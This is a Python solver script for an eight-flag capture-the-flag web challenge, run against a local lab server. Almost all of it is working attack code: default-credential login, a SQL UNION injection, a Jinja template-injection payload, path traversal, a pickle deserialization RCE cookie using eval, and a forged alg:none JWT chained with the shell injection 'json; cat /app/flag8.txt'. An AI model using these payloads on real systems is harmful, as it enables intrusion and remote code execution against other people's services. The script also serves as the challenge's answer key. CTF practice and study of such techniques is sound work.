"""
Man-City — 8-flag solver.

    python3 solve.py                # localhost:8018
    python3 solve.py http://host:PORT
"""
from __future__ import annotations
import base64, hashlib, hmac, json, os, pickle, re, sys
import requests

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def _b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def solve(base: str) -> None:
    s = requests.Session()
    print(f"[*] target: {base}")
    flags = []

    # ── Flag 1 (Easy): HTML source comment ─────────────────────
    r = s.get(f"{base}/")
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 1 [source comment]", m.group(1)))
    else:
        flags.append(("Flag 1", "FAIL"))

    # ── Flag 2 (Easy): robots.txt → /backup/ ──────────────────
    r = s.get(f"{base}/robots.txt")
    assert "/backup/" in r.text
    r = s.get(f"{base}/backup/")
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 2 [robots/backup]", m.group(1)))
    else:
        flags.append(("Flag 2", "FAIL"))

    # ── Flag 3 (Medium): Default creds admin:admin123 ──────────
    r = s.post(f"{base}/login", data={"username": "admin", "password": "admin123"}, allow_redirects=True)
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 3 [default creds]", m.group(1)))
    else:
        flags.append(("Flag 3", "FAIL"))

    # ── Flag 4 (Medium): SQLi UNION SELECT ────────────────────
    payload = "' UNION SELECT id, key, value, id FROM secrets--"
    r = s.get(f"{base}/search", params={"q": payload})
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 4 [SQLi]", m.group(1)))
    else:
        flags.append(("Flag 4", "FAIL"))

    # ── Flag 5 (Hard): SSTI ───────────────────────────────────
    ssti = "{{lipsum.__globals__['os'].environ.get('FLAG5','?')}}"
    r = s.post(f"{base}/player/bio", data={"nickname": ssti})
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 5 [SSTI]", m.group(1)))
    else:
        flags.append(("Flag 5", "FAIL"))

    # ── Flag 6 (Hard): Path traversal ─────────────────────────
    r = s.get(f"{base}/download", params={"file": "../flag6.txt"})
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 6 [LFI]", m.group(1)))
    else:
        flags.append(("Flag 6", "FAIL"))

    # ── Flag 7 (Insane): Pickle deserialization ───────────────
    # Return a dict so the template renders without error, with flag in theme
    class PickleExploit:
        def __reduce__(self):
            return (eval, ("{'theme':__import__('os').environ.get('FLAG7','no'),'lang':'en','notifications':True}",))

    evil_cookie = base64.b64encode(pickle.dumps(PickleExploit())).decode()
    r = s.get(f"{base}/preferences", cookies={"prefs": evil_cookie})
    m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
    if m:
        flags.append(("Flag 7 [pickle RCE]", m.group(1)))
    else:
        flags.append(("Flag 7", "FAIL"))

    # ── Flag 8 (Extreme): JWT alg:none + cmd injection ────────
    # Step 1: Get a valid token (any user)
    r = s.post(f"{base}/api/auth", json={"username": "scout", "password": "scout2026"})
    token_data = r.json()
    if "token" not in token_data:
        flags.append(("Flag 8", "FAIL - no token"))
    else:
        # Step 2: Forge JWT with alg:none and role:superadmin
        header = {"alg": "none", "typ": "JWT"}
        payload = {"sub": "scout", "role": "superadmin", "iat": 1700000000}
        h = _b64url_encode(json.dumps(header).encode())
        p = _b64url_encode(json.dumps(payload).encode())
        forged = f"{h}.{p}."

        # Step 3: Command injection via format parameter
        r = s.get(f"{base}/api/export",
                  params={"format": "json; cat /app/flag8.txt"},
                  headers={"Authorization": f"Bearer {forged}"})
        m = re.search(r"(INFODAYS\{[^}]+\})", r.text)
        if m:
            flags.append(("Flag 8 [JWT+RCE]", m.group(1)))
        else:
            flags.append(("Flag 8", f"FAIL - {r.text[:200]}"))

    # ── Summary ───────────────────────────────────────────────
    print()
    ok = 0
    for name, flag in flags:
        status = "+" if "INFODAYS{" in flag else "-"
        print(f"[{status}] {name}: {flag}")
        if status == "+":
            ok += 1
    print(f"\n[*] {ok}/8 flags captured")


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8018"
    solve(base.rstrip("/"))
